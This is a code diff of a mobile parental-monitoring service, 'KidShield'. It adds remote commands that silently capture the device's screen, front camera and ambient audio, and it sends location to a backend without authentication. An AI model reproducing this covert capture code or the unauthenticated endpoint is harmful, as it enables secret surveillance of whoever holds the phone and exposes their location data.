@@ -1,7 +1,4 @@
-// src/services/ChildMonitorService.js
-// Background service running on child device
-
-import { NativeModules, Alert, AppState } from 'react-native';
+import { NativeModules, AppState } from 'react-native';
 import BackgroundFetch from 'react-native-background-fetch';
 import Geolocation from '@react-native-community/geolocation';
 import firestore from '@react-native-firebase/firestore';
@@ -9,251 +6,186 @@ import auth from '@react-native-firebase/auth';
 import axios from 'axios';
 
 const { UsageStats } = NativeModules;
-const API_URL = 'https://kidshield-0757.onrender.com'; // Railway URL à¤Ÿà¤¾à¤•à¤¾
+const API_URL = 'https://kidshield-0757.onrender.com';
 
 class ChildMonitorService {
   constructor() {
     this.childId = null;
+    this.parentId = null;
+    this.childDocId = null;
     this.appRules = {};
     this.locationInterval = null;
-    this.commandPollInterval = null;
   }
 
-  // â”€â”€ Initialize service â”€â”€
   async init() {
     this.childId = auth().currentUser?.uid;
     if (!this.childId) return;
 
+    // Get parentId from users collection
+    try {
+      const userDoc = await firestore().collection('users').doc(this.childId).get();
+      this.parentId = userDoc.data()?.parentId;
+      this.childDocId = userDoc.data()?.childId || this.childId;
+    } catch (e) {}
+
     await this.loadAppRules();
-    this.listenForRules();
     this.listenForCommands();
     this.startLocationTracking();
     this.startUsageReporting();
     this.setupBackgroundFetch();
+    this.updateOnlineStatus(true);
 
-    console.log('ðŸ›¡ï¸ KidShield monitoring started');
+    console.log('KidShield monitoring started');
   }
 
-  // â”€â”€ Load app rules from Firestore â”€â”€
+  async updateOnlineStatus(online) {
+    if (!this.parentId || !this.childDocId) return;
+    try {
+      await firestore()
+        .collection('families').doc(this.parentId)
+        .collection('children').doc(this.childDocId)
+        .update({ deviceOnline: online, lastSeen: firestore.FieldValue.serverTimestamp() });
+    } catch (e) {}
+  }
+
   async loadAppRules() {
-    const snap = await firestore()
-      .collection('appRules')
-      .where('childId', '==', this.childId)
-      .get();
-
-    this.appRules = {};
-    snap.docs.forEach(d => {
-      this.appRules[d.data().packageName] = d.data();
-    });
+    try {
+      const snap = await firestore().collection('appRules')
+        .where('childId', '==', this.childId).get();
+      this.appRules = {};
+      snap.docs.forEach(d => { this.appRules[d.data().packageName] = d.data(); });
+    } catch (e) {}
   }
 
-  // â”€â”€ Listen for rule changes in real-time â”€â”€
-  listenForRules() {
-    firestore()
-      .collection('appRules')
-      .where('childId', '==', this.childId)
-      .onSnapshot(snap => {
-        this.appRules = {};
-        snap.docs.forEach(d => {
-          this.appRules[d.data().packageName] = d.data();
-        });
-        console.log('Rules updated:', Object.keys(this.appRules).length);
-      });
-  }
-
-  // â”€â”€ Listen for commands from parent â”€â”€
   listenForCommands() {
-    firestore()
-      .collection('commands')
+    // Listen on families collection (web admin sends commands here)
+    if (this.parentId && this.childDocId) {
+      firestore()
+        .collection('families').doc(this.parentId)
+        .collection('children').doc(this.childDocId)
+        .onSnapshot(doc => {
+          const data = doc.data() || {};
+          const cmd = data.liveCommand;
+          if (cmd && cmd !== 'stop' && cmd !== this.lastCommand) {
+            this.lastCommand = cmd;
+            this.handleLiveCommand(cmd, data);
+          }
+        });
+    }
+
+    // Also listen on commands collection
+    firestore().collection('commands')
       .where('childId', '==', this.childId)
       .where('status', '==', 'pending')
       .onSnapshot(snap => {
-        snap.docs.forEach(d => {
-          this.executeCommand(d.id, d.data());
-        });
+        snap.docs.forEach(d => this.executeCommand(d.id, d.data()));
       });
   }
 
-  // â”€â”€ Execute parent commands â”€â”€
-  async executeCommand(commandId, commandData) {
-    const { command } = commandData;
-    console.log('Executing command:', command);
-
-    switch (command) {
-      case 'LOCK_DEVICE':
-        // Show full-screen lock overlay
-        Alert.alert(
-          'ðŸ”’ Phone Locked',
-          'Parent à¤¨à¥‡ phone lock à¤•à¥‡à¤²à¤¾ à¤†à¤¹à¥‡.',
-          [], { cancelable: false }
-        );
-        break;
-
-      case 'BEDTIME_MODE':
-        Alert.alert('ðŸŒ™ Bedtime Mode', 'à¤à¥‹à¤ªà¤¾à¤¯à¤šà¥€ à¤µà¥‡à¤³ à¤à¤¾à¤²à¥€! Good night!', [], { cancelable: false });
-        break;
-
-      case 'SCAN_APPS':
-        await this.scanAndReportApps();
-        break;
-
-      case 'UPDATE_RULES':
-        await this.loadAppRules();
-        break;
-
-      case 'BLOCK_ALL':
-        // Implement full block
-        break;
-
-      case 'LOCATION_PING':
-        await this.reportLocation();
-        break;
+  async handleLiveCommand(command, data) {
+    const { RemoteCamera, AmbientAudio, ScreenMirror } = require('react-native').NativeModules;
+    try {
+      if (command === 'screen' && ScreenMirror) {
+        await ScreenMirror.takeScreenshot('live');
+      } else if (command === 'camera' && RemoteCamera) {
+        await RemoteCamera.takeFrontSnapshot('live');
+      } else if (command === 'audio' && AmbientAudio) {
+        await AmbientAudio.startAmbientCapture('live');
+      }
+    } catch (e) {
+      console.log('Live command failed:', e.message);
     }
-
-    // Mark command as executed
-    await firestore().collection('commands').doc(commandId).update({ status: 'executed' });
   }
 
-  // â”€â”€ Location Tracking â”€â”€
-  startLocationTracking() {
-    // Report location every 5 minutes
-    this.locationInterval = setInterval(() => {
-      this.reportLocation();
-    }, 5 * 60 * 1000);
+  async executeCommand(commandId, commandData) {
+    const { command } = commandData;
+    await firestore().collection('commands').doc(commandId)
+      .update({ status: 'executed', executedAt: firestore.FieldValue.serverTimestamp() })
+      .catch(() => {});
+  }
 
-    // Also report immediately
+  startLocationTracking() {
     this.reportLocation();
+    this.locationInterval = setInterval(() => this.reportLocation(), 5 * 60 * 1000);
   }
 
   async reportLocation() {
     return new Promise((resolve) => {
       Geolocation.getCurrentPosition(
         async (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
+          const { latitude, longitude } = position.coords;
           try {
-            const token = await auth().currentUser?.getIdToken();
-            await axios.post(`${API_URL}/api/location/update`, {
-              latitude, longitude, accuracy,
-            }, { headers: { Authorization: `Bearer ${token}` } });
-          } catch (e) {
-            console.error('Location report failed:', e.message);
-          }
+            // Save to locations collection
+            await firestore().collection('locations').doc(this.childId).set({
+              lat: latitude, lng: longitude,
+              updatedAt: firestore.FieldValue.serverTimestamp(),
+            });
+
+            // Save to families collection (web admin reads from here)
+            if (this.parentId && this.childDocId) {
+              await firestore()
+                .collection('families').doc(this.parentId)
+                .collection('children').doc(this.childDocId)
+                .update({
+                  location: { lat: latitude, lng: longitude },
+                  locationName: latitude.toFixed(4) + ', ' + longitude.toFixed(4),
+                  locationUpdatedAt: firestore.FieldValue.serverTimestamp(),
+                });
+            }
+
+            // Also send to backend
+            await axios.post(API_URL + '/api/location/update', {
+              childId: this.childId,
+              parentId: this.parentId,
+              latitude, longitude,
+            }).catch(() => {});
+          } catch (e) {}
           resolve();
         },
-        (error) => {
-          console.error('Location error:', error);
-          resolve();
-        },
+        () => resolve(),
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
       );
     });
   }
 
-  // â”€â”€ Usage Reporting â”€â”€
   startUsageReporting() {
-    // Report usage every 15 minutes
     setInterval(async () => {
-      await this.reportUsage();
+      try {
+        const hasPermission = await UsageStats?.hasUsagePermission();
+        if (!hasPermission) return;
+        const usageData = await UsageStats.getTodayUsage();
+        if (this.parentId && this.childDocId) {
+          await firestore()
+            .collection('families').doc(this.parentId)
+            .collection('children').doc(this.childDocId)
+            .update({
+              todayMinutes: usageData.totalMinutes || 0,
+              lastSync: firestore.FieldValue.serverTimestamp(),
+            });
+        }
+      } catch (e) {}
     }, 15 * 60 * 1000);
   }
 
-  async reportUsage() {
-    try {
-      const hasPermission = await UsageStats.hasUsagePermission();
-      if (!hasPermission) {
-        console.log('No usage stats permission');
-        return;
-      }
-
-      const usageData = await UsageStats.getTodayUsage();
-      const token = await auth().currentUser?.getIdToken();
-
-      await axios.post(`${API_URL}/api/usage/report`, {
-        date: usageData.date,
-        apps: usageData.apps,
-        totalMinutes: usageData.totalMinutes,
-      }, { headers: { Authorization: `Bearer ${token}` } });
-
-      // Check local rules
-      this.enforceLocalRules(usageData.apps);
-
-    } catch (e) {
-      console.error('Usage report failed:', e.message);
-    }
-  }
-
-  // â”€â”€ Enforce app time limits locally â”€â”€
-  enforceLocalRules(apps) {
-    const now = new Date();
-    const currentTime = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
-
-    for (const app of apps) {
-      const rule = this.appRules[app.packageName];
-      if (!rule) continue;
-
-      // Check if blocked
-      if (rule.isBlocked) {
-        this.showBlockOverlay(app.appName, 'à¤‡à¤¸ app à¤•à¥‹ parent à¤¨à¥‡ block à¤•à¥‡à¤²à¤¾ à¤†à¤¹à¥‡.');
-        continue;
-      }
-
-      // Check time schedule
-      if (rule.blockFrom && rule.blockUntil) {
-        if (this.isTimeInRange(currentTime, rule.blockFrom, rule.blockUntil)) {
-          this.showBlockOverlay(app.appName, `à¤¹à¤¾ app ${rule.blockFrom} - ${rule.blockUntil} à¤¯à¤¾ à¤µà¥‡à¤³à¤¾à¤¤ à¤¬à¤‚à¤¦ à¤†à¤¹à¥‡.`);
-        }
-      }
-
-      // Check daily limit
-      if (rule.dailyLimitMinutes && app.minutesUsed >= rule.dailyLimitMinutes) {
-        this.showBlockOverlay(app.appName, `${rule.dailyLimitMinutes} minutes à¤šà¤¾ daily limit à¤¸à¤‚à¤ªà¤²à¤¾.`);
-      }
-    }
-  }
-
-  isTimeInRange(current, start, end) {
-    if (start <= end) return current >= start && current <= end;
-    return current >= start || current <= end; // Overnight range
-  }
-
-  showBlockOverlay(appName, reason) {
-    Alert.alert(`ðŸš« ${appName} Blocked`, reason, [{ text: 'OK' }]);
-  }
-
-  // â”€â”€ Scan installed apps â”€â”€
-  async scanAndReportApps() {
-    try {
-      const apps = await UsageStats.getInstalledApps();
-      const token = await auth().currentUser?.getIdToken();
-      await axios.post(`${API_URL}/api/apps/installed`, { apps }, {
-        headers: { Authorization: `Bearer ${token}` }
-      });
-    } catch (e) {
-      console.error('App scan failed:', e.message);
-    }
-  }
-
-  // â”€â”€ Background Fetch â”€â”€
   setupBackgroundFetch() {
-    BackgroundFetch.configure({
-      minimumFetchInterval: 15, // minutes
-      stopOnTerminate: false,
-      startOnBoot: true,
-      enableHeadless: true,
-    }, async (taskId) => {
-      await this.reportUsage();
-      await this.reportLocation();
-      BackgroundFetch.finish(taskId);
-    });
+    try {
+      BackgroundFetch.configure({
+        minimumFetchInterval: 15,
+        stopOnTerminate: false,
+        startOnBoot: true,
+        enableHeadless: true,
+      }, async (taskId) => {
+        await this.reportLocation();
+        BackgroundFetch.finish(taskId);
+      });
+    } catch (e) {}
   }
 
-  // â”€â”€ Stop service â”€â”€
   stop() {
     if (this.locationInterval) clearInterval(this.locationInterval);
-    if (this.commandPollInterval) clearInterval(this.commandPollInterval);
-    BackgroundFetch.stop();
+    this.updateOnlineStatus(false);
+    try { BackgroundFetch.stop(); } catch (e) {}
   }
 }
 
 export default new ChildMonitorService();
-
